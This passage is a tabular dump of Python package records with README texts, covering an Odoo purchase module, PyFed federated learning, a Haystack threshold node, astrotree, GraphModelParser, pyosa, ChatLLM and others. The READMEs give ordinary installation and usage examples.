    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module excludes RFQs pending to validate or validated when procuring a product.

If a RFQ, at some point, is requested to validate, it converts it immediately in something unmodifiable.
Then, taking this into account, if we procure a product with the same supplier as one open RFQ, it should
check if that is under validation or already validated and discard it on any of both cases.

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* ForgeFlow

Contributors
~~~~~~~~~~~~

* Bernat Puig Font 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-bosd| image:: https://github.com/bosd.png?size=40px
    :target: https://github.com/bosd
    :alt: bosd

Current `maintainer `__:

|maintainer-bosd| 

This module is part of the `OCA/purchase-workflow `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-workflow
boston,https://github.com/dltpdn/boston,1,0,0,,,dltpdn/boston
pyfed,https://github.com/amirrezasokhankhosh/PyFed,4,5911,5901,"# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. </br>
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. </br>
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
## data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed.components import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run the server and clients files separately and simultaneously to get federated learning!


","# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. 
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. 
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
## data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed.components import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run the server and clients files separately and simultaneously to get federated learning!


",amirrezasokhankhosh/pyfed
vbao-mvvm,https://github.com/Meidozuki/VBAO,0,778,778,"# VBAO

> A library aiming for building an MVVM (or MVFM) project

## How does it work?

We implement the data-binding, command-binding and property-change-notification to form an MVVM system.

![](img/binding.dot.jpg)

data-binding & command-binding

![](img/changing.dot.jpg)

property-change-notification

When we make it, the interaction among them is as follows.

![](img/action.dot.jpg)

### Filetree

├── qt-test

├── Lib_VBao

├── model

├── view

├── viewmodel

├── window

├── common_parameter.h

├── main.cpp

├── CMakeLists.txt

├── LICENSE

└── README.md


### Special Thanks

[Zhejiang-University-GKC/SJDXQcourseware: The courseware of SJDXQ (github.com)](https://github.com/Zhejiang-University-GKC/SJDXQcourseware)
","# VBAO

> A library aiming for building an MVVM (or MVFM) project

## How does it work?

We implement the data-binding, command-binding and property-change-notification to form an MVVM system.

![](img/binding.dot.jpg)

data-binding & command-binding

![](img/changing.dot.jpg)

property-change-notification

When we make it, the interaction among them is as follows.

![](img/action.dot.jpg)

### Filetree

├── qt-test

├── Lib_VBao

├── model

├── view

├── viewmodel

├── window

├── common_parameter.h

├── main.cpp

├── CMakeLists.txt

├── LICENSE

└── README.md


### Special Thanks

[Zhejiang-University-GKC/SJDXQcourseware: The courseware of SJDXQ (github.com)](https://github.com/Zhejiang-University-GKC/SJDXQcourseware)
",meidozuki/vbao
age-detection,https://github.com/javatechy/dokr,0,72,72,"This is a package for running age detection and getting approximate age
","This is a package for running age detection and getting approximate age
",javatechy/dokr
haystack-threshold-node,https://github.com/recrudesce/haystack_threshold_node,1,2257,2257,"# haystack_threshold_node
This component filters documents based on a threshold percentage, ensuring only the documents above the threshold get passed down the pipeline.
This allows you to query your document store for a larger top_k, but then filter the results down to those which are above a set confidence score.

## Installation

`pip install haystack-threshold-node`

## Usage

Include it in your pipeline - example as follows:

```python
import logging
import re

from datasets import load_dataset
from haystack.document_stores import InMemoryDocumentStore
from haystack.nodes import PromptNode, PromptTemplate, AnswerParser, BM25Retriever
from haystack.pipelines import Pipeline
from haystack_lemmatize_node import LemmatizeDocuments


logging.basicConfig(format=""%(levelname)s - %(name)s -  %(message)s"", level=logging.WARNING)
logging.getLogger(""haystack"").setLevel(logging.INFO)

document_store = InMemoryDocumentStore(use_bm25=True)

dataset = load_dataset(""bilgeyucel/seven-wonders"", split=""train"")
document_store.write_documents(dataset)

retriever = BM25Retriever(document_store=document_store, top_k=10)

lfqa_prompt = PromptTemplate(
    name=""lfqa"",
    prompt_text=""Given the context please answer the question using your own words. Generate a comprehensive, summarized answer. If the information is not included in the provided context, reply with 'Provided documents didn't contain the necessary information to provide the answer'\n\nContext: {documents}\n\nQuestion: {query} \n\nAnswer:"",
    output_parser=AnswerParser(),
)

prompt_node = PromptNode(
    model_name_or_path=""text-davinci-003"",
    default_prompt_template=lfqa_prompt,
    max_length=500,
    api_key=""sk-OPENAIKEY"",
)

# The value you pass for threshold is the lowest % score you will accept. Whole numbers only.
# In this example, the threshold is set to 80%.
threshold = DocumentThreshold(threshold=80) 

pipe = Pipeline()
pipe.add_node(component=retriever, name=""Retriever"", inputs=[""Query""])
pipe.add_node(component=threshold, name=""Threshold"", inputs=[""Retriever""])
pipe.add_node(component=prompt_node, name=""prompt_node"", inputs=[""Threshold""])

query = ""What does the Rhodes Statue look like?""
  
output = pipe.run(query)

print(output['answers'][0].answer)
```","# haystack_threshold_node
This component filters documents based on a threshold percentage, ensuring only the documents above the threshold get passed down the pipeline.
This allows you to query your document store for a larger top_k, but then filter the results down to those which are above a set confidence score.

## Installation

`pip install haystack-threshold-node`

## Usage

Include it in your pipeline - example as follows:

```python
import logging
import re

from datasets import load_dataset
from haystack.document_stores import InMemoryDocumentStore
from haystack.nodes import PromptNode, PromptTemplate, AnswerParser, BM25Retriever
from haystack.pipelines import Pipeline
from haystack_lemmatize_node import LemmatizeDocuments


logging.basicConfig(format=""%(levelname)s - %(name)s -  %(message)s"", level=logging.WARNING)
logging.getLogger(""haystack"").setLevel(logging.INFO)

document_store = InMemoryDocumentStore(use_bm25=True)

dataset = load_dataset(""bilgeyucel/seven-wonders"", split=""train"")
document_store.write_documents(dataset)

retriever = BM25Retriever(document_store=document_store, top_k=10)

lfqa_prompt = PromptTemplate(
    name=""lfqa"",
    prompt_text=""Given the context please answer the question using your own words. Generate a comprehensive, summarized answer. If the information is not included in the provided context, reply with 'Provided documents didn't contain the necessary information to provide the answer'\n\nContext: {documents}\n\nQuestion: {query} \n\nAnswer:"",
    output_parser=AnswerParser(),
)

prompt_node = PromptNode(
    model_name_or_path=""text-davinci-003"",
    default_prompt_template=lfqa_prompt,
    max_length=500,
    api_key=""sk-OPENAIKEY"",
)

# The value you pass for threshold is the lowest % score you will accept. Whole numbers only.
# In this example, the threshold is set to 80%.
threshold = DocumentThreshold(threshold=80) 

pipe = Pipeline()
pipe.add_node(component=retriever, name=""Retriever"", inputs=[""Query""])
pipe.add_node(component=threshold, name=""Threshold"", inputs=[""Retriever""])
pipe.add_node(component=prompt_node, name=""prompt_node"", inputs=[""Threshold""])

query = ""What does the Rhodes Statue look like?""
  
output = pipe.run(query)

print(output['answers'][0].answer)
```",recrudesce/haystack_threshold_node
astrotree,https://github.com/arka378/astrotree,3,2101,2085,"# Welcome to astrotree!

A lightweight, purely python package to handle reference trees.
This project evolved because of a personal urge to organize literature from my day-to-day.
Note that this is not a reference manager: if you are looking for a python-based reference manager, look no further than [Papis](https://pypi.org/project/papis/)!

This project helps you connect literature entries: given an article, you can choose to build a tree of other articles that connect to it. These are articles referenced in the article of interest (references), or works that cited it (citations). Trees can be built to arbitrary depths, limited only by resources available to python and records on the internet, at any level of the tree.

The project presently uses the NASA-ADS API (see [ADS Docs](https://ui.adsabs.harvard.edu/help/api/api-docs.html#servers)) to launch queries and is suited to my use case; any efforts to contribute and extend it to other APIs are welcome!

# Installation

Install directly through pip:

    pip install astrotree

# Prerequisite

Before you can start to use this application, you need to set an environment variable `ADSTOKEN`, which needs to point to your ADS API token.
Follow the instructions [here](https://ui.adsabs.harvard.edu/help/api/) to obtain your ADS API token.
You are subject to the [ADS API Terms of Service](https://ui.adsabs.harvard.edu/help/terms/) through your use of this application.

# Usage
The application is CLI-based and has two modes: you may choose to build either a reference tree or a citation tree.
To build a reference tree, use:

    astrotree -id <ADS id> --ref 

To build a citation tree, use:

    astrotree -id <ADS id> --cite


In either case the output is a list of ADS IDs and the respective article titles, in a tree format. The tool offers you the opportunity to ask to build a tree for any of the listed IDs, restricted to the same mode you started with.

Upon exit (press n when the application asks if you wish to continue), the tree is dumped to a text file containing the tree in the local directory, for future use.



 


","# Welcome to astrotree!

A lightweight, purely python package to handle reference trees.
This project evolved because of a personal urge to organize literature from my day-to-day.
Note that this is not a reference manager: if you are looking for a python-based reference manager, look no further than [Papis](https://pypi.org/project/papis/)!

This project helps you connect literature entries: given an article, you can choose to build a tree of other articles that connect to it. These are articles referenced in the article of interest (references), or works that cited it (citations). Trees can be built to arbitrary depths, limited only by resources available to python and records on the internet, at any level of the tree.

The project presently uses the NASA-ADS API (see [ADS Docs](https://ui.adsabs.harvard.edu/help/api/api-docs.html#servers)) to launch queries and is suited to my use case; any efforts to contribute and extend it to other APIs are welcome!

# Installation

Install directly through pip:

    pip install astrotree

# Prerequisite

Before you can start to use this application, you need to set an environment variable `ADSTOKEN`, which needs to point to your ADS API token.
Follow the instructions [here](https://ui.adsabs.harvard.edu/help/api/) to obtain your ADS API token.
You are subject to the [ADS API Terms of Service](https://ui.adsabs.harvard.edu/help/terms/) through your use of this application.

# Usage
The application is CLI-based and has two modes: you may choose to build either a reference tree or a citation tree.
To build a reference tree, use:

    astrotree -id  --ref 

To build a citation tree, use:

    astrotree -id  --cite


In either case the output is a list of ADS IDs and the respective article titles, in a tree format. The tool offers you the opportunity to ask to build a tree for any of the listed IDs, restricted to the same mode you started with.

Upon exit (press n when the application asks if you wish to continue), the tree is dumped to a text file containing the tree in the local directory, for future use.



 


",arka378/astrotree
deltatopic,https://github.com/causalpathlab/deltaTopic,0,0,0,,,causalpathlab/deltatopic
graph-model-parser,https://github.com/albertbuchard/GraphModelParser,2,1768,1768,"# GraphModelParser

GraphModelParser is a Python library for representing and simulating dynamical graph models from a string description. The library supports various probability distributions such as normal, poisson, expon, binom, and uniform from the `scipy.stats` module.

## Installation

You can install GraphModelParser from PyPI by running:

```bash
pip install graph-model-parser
```

## Usage

```python
from graph_model_parser import GraphModelParser
import numpy as np

# Set seed for reproducibility
np.random.seed(42)

model_description = '''
            a_{t} = a_{t-1} + 1
            b_{t} = b_{t-1} + 2*b_{t-2} + a_0
            c_{t} = c_{t-1} + normal(1, 2)
            '''
# Always enclose the dynamic time index in curly braces e.g. {t-1}  
initial_values = {'a_0': 0, 'a_1': 1, 'b_0': 0, 'b_1': 1, 'c_0': 0}
model = GraphModelParser(model_description, initial_values)
print(model(t=20))
```

In this example, we define a simple dynamical graph model with three variables (`a_{t}`, `b_{t}`, and `c_{t}`) and their relationships over time. The `c_{t}` variable is also affected by a random normal distribution with a mean of 1 and a standard deviation of 2.

## Features

- Define dynamical graph models using a simple string-based syntax.
- Support for various probability distributions from `scipy.stats`, including normal, poisson, expon, binom, and uniform.
- Easily compute the values of variables at specific time points.
- Define initial values for variables and model their evolution over time.

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)
","# GraphModelParser

GraphModelParser is a Python library for representing and simulating dynamical graph models from a string description. The library supports various probability distributions such as normal, poisson, expon, binom, and uniform from the `scipy.stats` module.

## Installation

You can install GraphModelParser from PyPI by running:

```bash
pip install graph-model-parser
```

## Usage

```python
from graph_model_parser import GraphModelParser
import numpy as np

# Set seed for reproducibility
np.random.seed(42)

model_description = '''
            a_{t} = a_{t-1} + 1
            b_{t} = b_{t-1} + 2*b_{t-2} + a_0
            c_{t} = c_{t-1} + normal(1, 2)
            '''
# Always enclose the dynamic time index in curly braces e.g. {t-1}  
initial_values = {'a_0': 0, 'a_1': 1, 'b_0': 0, 'b_1': 1, 'c_0': 0}
model = GraphModelParser(model_description, initial_values)
print(model(t=20))
```

In this example, we define a simple dynamical graph model with three variables (`a_{t}`, `b_{t}`, and `c_{t}`) and their relationships over time. The `c_{t}` variable is also affected by a random normal distribution with a mean of 1 and a standard deviation of 2.

## Features

- Define dynamical graph models using a simple string-based syntax.
- Support for various probability distributions from `scipy.stats`, including normal, poisson, expon, binom, and uniform.
- Easily compute the values of variables at specific time points.
- Define initial values for variables and model their evolution over time.

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)
",albertbuchard/graphmodelparser
flopsy,https://github.com/bgribble/flopsy,0,0,0,,,bgribble/flopsy
pyosa,https://github.com/akapet00/pyosa,3,1675,1577,"# PyOpenSurfaceArea

Estimates the area of an open surface represented as a point cloud in 3-D space.

## Installation

Install it simply by
```shell
pip install pyosa
```

## Usage

A simple example of estimating the surface area composed of all points within some radius around a targeted point on the surface of the Stanford bunny is shown below. Run `example.py` to reproduce this example.

```python
from matplotlib.patches import Circle
import numpy as np
from scipy import spatial

import pyosa


# laod the data
xyz = np.genfromtxt('bunny100k.xyz', delimiter=' ')
    
# downsampling the point cloud just a bit for visualization purposes
N = xyz.shape[0]
num = 0.05 * N
mask = np.arange(0, N, int(N/num))
xyz_ds = xyz[mask]
    
# extract an arbitrary, open surface for which we want to extract the area
point = xyz_ds[np.argmax(xyz_ds[:, 2]), :]
tree = spatial.KDTree(xyz_ds)
r = 0.5
ind = tree.query_ball_point(point, r)

# extraction of the surface area is as simple as
surf = xyz_ds[ind]
area = pyosa.estimate(surf)

# show the resulting figure
circle = patches.Circle(point, r, fc='none', ec='k')
fig, ax  = show_pcd(xyz_ds, point, circle)  # impementation in example.py
ax.set_title(f'surface area: {area:.2f}')
```

<p align=""center""><img src=""https://github.com/akapet00/pyosa/raw/main/bunny.png"" width=""60%""></p>

## Shortcomings

The current implementation is limited to open surfaces in 3-D space. The surface is assumed to have the least amount of variance in its ""height"" direction, that is, the surface is observed from the point of view on the normal at the center of the surface.

## License
[MIT](https://github.com/akapet00/pyosa/blob/main/LICENSE)
","# PyOpenSurfaceArea

Estimates the area of an open surface represented as a point cloud in 3-D space.

## Installation

Install it simply by
```shell
pip install pyosa
```

## Usage

A simple example of estimating the surface area composed of all points within some radius around a targeted point on the surface of the Stanford bunny is shown below. Run `example.py` to reproduce this example.

```python
from matplotlib.patches import Circle
import numpy as np
from scipy import spatial

import pyosa


# laod the data
xyz = np.genfromtxt('bunny100k.xyz', delimiter=' ')
    
# downsampling the point cloud just a bit for visualization purposes
N = xyz.shape[0]
num = 0.05 * N
mask = np.arange(0, N, int(N/num))
xyz_ds = xyz[mask]
    
# extract an arbitrary, open surface for which we want to extract the area
point = xyz_ds[np.argmax(xyz_ds[:, 2]), :]
tree = spatial.KDTree(xyz_ds)
r = 0.5
ind = tree.query_ball_point(point, r)

# extraction of the surface area is as simple as
surf = xyz_ds[ind]
area = pyosa.estimate(surf)

# show the resulting figure
circle = patches.Circle(point, r, fc='none', ec='k')
fig, ax  = show_pcd(xyz_ds, point, circle)  # impementation in example.py
ax.set_title(f'surface area: {area:.2f}')
```



## Shortcomings

The current implementation is limited to open surfaces in 3-D space. The surface is assumed to have the least amount of variance in its ""height"" direction, that is, the surface is observed from the point of view on the normal at the center of the surface.

## License
[MIT](https://github.com/akapet00/pyosa/blob/main/LICENSE)
",akapet00/pyosa
scarlet-shark-python,https://github.com/PiRogueToolSuite/scarlet-shark-python,1,18,18,"file: README.md


","file: README.md


",piroguetoolsuite/scarlet-shark-python
chatllm,https://github.com/yuanjie-ai/ChatLLM,14,3812,3553,"![image](https://img.shields.io/pypi/v/llm4gpt.svg) ![image](https://img.shields.io/travis/yuanjie-ai/llm4gpt.svg) ![image](https://readthedocs.org/projects/llm4gpt/badge/?version=latest)

<h1 align = ""center"">🔥ChatLLM 基于知识库🔥</h1>

<div align=center>
<img src=""data/imgs/LLM.drawio.png""/>
</div>

## Install

```shell
pip install -U chatllm
```

## [Docs](https://yuanjie-ai.github.io/ChatLLM/)

## Usages

```python
from chatllm.applications import ChatBase

qa = ChatBase()
qa.load_llm4chat(model_name_or_path=""THUDM/chatglm-6b"")

_ = list(qa(query='周杰伦是谁', knowledge_base='周杰伦是傻子', role=' '))
# 根据已知信息无法回答该问题，因为周杰伦是中国内地流行歌手、演员、音乐制作人、导演，
# 是具有一定的知名度和专业能力的人物，没有提供足够的信息无法判断他是傻子。
```
- 支持角色扮演
![img.png](data/imgs/role.png)

## ChatPDF
<details markdown=""1"">
  <summary>Click to ChatPDF</summary>

一键启动UI `chatllm-run webui --name chatpdf`

```python
from chatllm.applications.chatpdf import ChatPDF

qa = ChatPDF(encode_model='nghuyong/ernie-3.0-nano-zh')
qa.load_llm4chat(model_name_or_path=""THUDM/chatglm-6b"")
qa.create_index('财报.pdf')  # 构建知识库

list(qa(query='东北证券主营业务'))
# 根据已知信息，东北证券的主营业务为证券业务。公司作为证券公司，主要从事证券经纪、证券投资咨询、与证券交易、
# 证券投资活动有关的财务顾问、证券承销与保荐、证券自营、融资融券、证券投资基金代销和代销金融产品待业务。
```
- 支持查看召回结果
![向量召回结果](data/imgs/chatpdf.gif)

</details>

## Deploy

<details markdown=""1"">
  <summary>Click to Deploy</summary>

- ChatGLM-6B 模型硬件需求

    | **量化等级**   | **最低 GPU 显存**（推理） | **最低 GPU 显存**（高效参数微调） |
    | -------------- | ------------------------- | --------------------------------- |
    | FP16（无量化） | 13 GB                     | 14 GB                             |
    | INT8           | 8 GB                     | 9 GB                             |
    | INT4           | 6 GB                      | 7 GB                              |


- 从本地加载模型
  - [安装指南](docs/INSTALL.md)
  - [ChatGLM-6B Mac 本地部署实操记录](https://www.yuque.com/arvinxx/llm/chatglm-6b-deployment-on-mac)
  - [THUDM/ChatGLM-6B#从本地加载模型](https://github.com/THUDM/ChatGLM-6B#从本地加载模型)

</details>

## TODO
<details markdown=""1"">
  <summary>Click to TODO</summary>

- [ ] ChatLLM 应用
  - [x] 接入非结构化文档（已支持 md、pdf、docx、txt 文件格式）
  - [ ] 搜索引擎与本地网页接入
  - [ ] 结构化数据接入（如 csv、Excel、SQL 等）
  - [ ] 知识图谱/图数据库接入
  - [ ] 增加 ANN 后端，ES/RedisSearch【确保生产高可用】
  - [ ] 增加多级缓存缓存

- [ ] 多路召回
  - [ ] 问
    - [ ] 标量匹配
    - [x] 多种向量化，向量匹配
    - [ ] 增加相似问，换几个问法
    - [ ] 高置信度直接返回答案【匹配标准问】
  - [ ] 答
    - [ ] 高置信度篇章
    - [ ] 增加上下文信息
    - [ ] 增加夸篇章信息
    - [ ] 增加召回信息的相似信息
    - [ ] 提前生成标准问，匹配问
    - [ ] 拒绝推断


- [ ] 增加更多 LLM 模型支持
  - [x] [THUDM/chatglm-6b](https://huggingface.co/THUDM/chatglm-6b)
  - [ ] [THUDM/chatglm-6b-int8](https://huggingface.co/THUDM/chatglm-6b-int8)
  - [ ] [THUDM/chatglm-6b-int4](https://huggingface.co/THUDM/chatglm-6b-int4)
  - [ ] [THUDM/chatglm-6b-int4-qe](https://huggingface.co/THUDM/chatglm-6b-int4-qe)
  - [ ] [ClueAI/ChatYuan-large-v2](https://huggingface.co/ClueAI/ChatYuan-large-v2)
- [ ] 增加更多 Embedding 模型支持
  - [x] [nghuyong/ernie-3.0-nano-zh](https://huggingface.co/nghuyong/ernie-3.0-nano-zh)
  - [x] [nghuyong/ernie-3.0-base-zh](https://huggingface.co/nghuyong/ernie-3.0-base-zh)
  - [x] [shibing624/text2vec-base-chinese](https://huggingface.co/shibing624/text2vec-base-chinese)
  - [x] [GanymedeNil/text2vec-large-chinese](https://huggingface.co/GanymedeNil/text2vec-large-chinese)
- [x] 增加一键启动 webui
  - [x] 利用 streamlit 实现 ChatPDF，一键启动 `chatllm-run webui --name chatpdf`
  - [ ] 利用 gradio 实现 Web UI DEMO
  - [ ] 添加输出内容及错误提示
  - [ ] 引用标注
  - [ ] 增加知识库管理
    - [ ] 选择知识库开始问答
    - [ ] 上传文件/文件夹至知识库
    - [ ] 删除知识库中文件
- [ ] 增加 API 支持
  - [x] 利用 Fastapi/Flask/Grpc 实现流式接口 `chatllm-run flask-api --model_name_or_path <MODEL_PATH> --host 127.0.0.1 --port 8000`
  - [ ] 前后端分离，实现调用 API 的 Web UI Demo

## 交流群
![二维码]()

</details>





=======
History
=======

0.0.0 (2023-04-11)
------------------

* First release on PyPI.
","![image](https://img.shields.io/pypi/v/llm4gpt.svg) ![image](https://img.shields.io/travis/yuanjie-ai/llm4gpt.svg) ![image](https://readthedocs.org/projects/llm4gpt/badge/?version=latest)

🔥ChatLLM 基于知识库🔥




## Install

```shell
pip install -U chatllm
```

## [Docs](https://yuanjie-ai.github.io/ChatLLM/)

## Usages

```python
from chatllm.applications import ChatBase

qa = ChatBase()
qa.load_llm4chat(model_name_or_path=""THUDM/chatglm-6b"")

_ = list(qa(query='周杰伦是谁', knowledge_base='周杰伦是傻子', role=' '))
# 根据已知信息无法回答该问题，因为周杰伦是中国内地流行歌手、演员、音乐制作人、导演，
# 是具有一定的知名度和专业能力的人物，没有提供足够的信息无法判断他是傻子。
```
- 支持角色扮演
